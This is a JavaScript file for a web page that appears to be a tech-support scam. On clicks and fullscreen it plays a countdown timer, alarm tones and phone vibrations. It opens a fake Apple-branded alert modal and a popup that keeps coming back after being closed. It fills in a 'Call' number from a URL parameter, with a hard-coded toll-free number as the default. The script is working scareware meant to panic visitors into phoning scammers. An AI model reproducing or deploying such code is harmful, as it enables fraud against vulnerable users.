(() => {
let timeLeft = 5 * 60;

const display = document.getElementById("countdown");

function renderCountdown() {
  if (!display) return;

  const minutes = Math.floor(timeLeft / 60);
  const seconds = timeLeft % 60;
  display.textContent = `${minutes}:${seconds.toString().padStart(2, "0")}`;
}

renderCountdown();

const timer = setInterval(() => {
  renderCountdown();

  if (timeLeft <= 0) {
    clearInterval(timer);
    display.textContent = "0:00";
    display.closest(".support-countdown")?.classList.add("is-ended");
    return;
  }

  timeLeft--;
}, 1000);

let vibrationTimer = null;
let urgentToneTimer = null;

function startDemoVibration() {
  if (!vibrationTimer && 'vibrate' in navigator) {
    navigator.vibrate(180);
    vibrationTimer = setInterval(() => {
      navigator.vibrate(180);
    }, 3000);
  }

  if (!urgentToneTimer) {
    playUrgentClockTone();
    urgentToneTimer = setInterval(playUrgentClockTone, 3000);
  }
}

document.addEventListener("pointerdown", startDemoVibration, { once: true });

const messagePopup = document.getElementById("messagePopup");
const messagePopupClose = messagePopup?.querySelector(".message-popup-close");
const appleAlertModal = document.getElementById("appleAlertModal");
let popupReturnCount = 0;
const maxPopupReturns = 2;
let messageAudioContext = null;
const firstNotificationDelay = 250;
const secondNotificationDelay = 1100;

function getMessageAudioContext() {
  const AudioContext = window.AudioContext || window.webkitAudioContext;
  if (!AudioContext) return null;

  messageAudioContext ||= new AudioContext();
  messageAudioContext.resume?.();
  return messageAudioContext;
}

function playMessageTone() {
  const context = getMessageAudioContext();
  if (!context) return;

  const oscillator = context.createOscillator();
  const gain = context.createGain();

  oscillator.type = "sine";
  oscillator.frequency.setValueAtTime(880, context.currentTime);
  gain.gain.setValueAtTime(0.0001, context.currentTime);
  gain.gain.exponentialRampToValueAtTime(0.12, context.currentTime + 0.02);
  gain.gain.exponentialRampToValueAtTime(0.0001, context.currentTime + 0.22);

  oscillator.connect(gain);
  gain.connect(context.destination);
  oscillator.start();
  oscillator.stop(context.currentTime + 0.24);
}

function playUrgentClockTone() {
  const context = getMessageAudioContext();
  if (!context) return;

  [0, 0.18, 0.36].forEach((offset) => {
    const oscillator = context.createOscillator();
    const gain = context.createGain();
    const startAt = context.currentTime + offset;

    oscillator.type = 'square';
    oscillator.frequency.setValueAtTime(1320, startAt);
    gain.gain.setValueAtTime(0.0001, startAt);
    gain.gain.exponentialRampToValueAtTime(0.08, startAt + 0.015);
    gain.gain.exponentialRampToValueAtTime(0.0001, startAt + 0.11);

    oscillator.connect(gain);
    gain.connect(context.destination);
    oscillator.start(startAt);
    oscillator.stop(startAt + 0.12);
  });
}

function showMessagePopupAgain() {
  if (!messagePopup) return;

  messagePopup.classList.remove("is-hidden", "is-returning");
  void messagePopup.offsetWidth;
  messagePopup.classList.add("is-returning");
  playMessageTone();
}

function pulseMessagePopup() {
  if (!messagePopup) return;

  messagePopup.classList.remove("is-hidden", "is-returning");
  void messagePopup.offsetWidth;
  messagePopup.classList.add("is-returning");
}

function pulseMessagePopupTwice() {
  setTimeout(() => {
    pulseMessagePopup();
    playMessageTone();
  }, firstNotificationDelay);

  setTimeout(() => {
    pulseMessagePopup();
    playMessageTone();
  }, firstNotificationDelay + secondNotificationDelay);
}

function vibrateBriefly() {
  if ("vibrate" in navigator) {
    navigator.vibrate([120, 60, 120]);
  }
}

function openDemoModal() {
  if (!appleAlertModal) return;

  appleAlertModal.classList.add("show");
  appleAlertModal.style.display = "block";
  appleAlertModal.removeAttribute("aria-hidden");
  appleAlertModal.setAttribute("aria-modal", "true");
}

function closeDemoModal() {
  if (!appleAlertModal) return;

  appleAlertModal.classList.remove("show");
  appleAlertModal.style.display = "none";
  appleAlertModal.setAttribute("aria-hidden", "true");
  appleAlertModal.removeAttribute("aria-modal");
}

function runAlertEffects() {
  getMessageAudioContext();
  pulseMessagePopupTwice();
  playUrgentClockTone();
  vibrateBriefly();
}

messagePopupClose?.addEventListener("click", () => {
  if (!messagePopup) return;

  getMessageAudioContext();
  messagePopup.classList.remove("is-returning");
  messagePopup.classList.add("is-hidden");

  if (popupReturnCount >= maxPopupReturns) return;

  popupReturnCount++;
  setTimeout(showMessagePopupAgain, 650);
});

appleAlertModal?.addEventListener("click", (event) => {
  if (event.target.closest("[data-modal-close]")) {
    closeDemoModal();
  }
});

document.addEventListener("click", (event) => {
  if (
    event.target.closest("a") ||
    event.target.closest("button") ||
    event.target.closest(".modal-dialog")
  ) {
    return;
  }
  runAlertEffects();

  openDemoModal();
});
document.addEventListener('fullscreenchange', () => {
  if (document.fullscreenElement) {
    runAlertEffects();
  }
});

document.addEventListener("DOMContentLoaded", function () {
  const rawPhone = new URLSearchParams(window.location.search).get("p");

  let phoneNumber = "+1-844-959-1967";

  if (rawPhone) {
    const clean = rawPhone.replace(/\D/g, "");

    phoneNumber = clean.startsWith("1") ? `+${clean}` : `+1-${clean}`;
  }

  document.querySelectorAll('a[href^="tel:"]').forEach((link) => {
    link.href = `tel:${phoneNumber}`;

    const text = link.textContent.trim();

    if (text.startsWith("Call")) {
      link.textContent = `Call ${phoneNumber}`;
    } else if (/^\+?[\d\s\-()]+$/.test(text)) {
      link.textContent = phoneNumber;
    }
  });

  document.querySelectorAll(".dynamic-phone").forEach((el) => {
    el.textContent = phoneNumber;
  });
});

})();
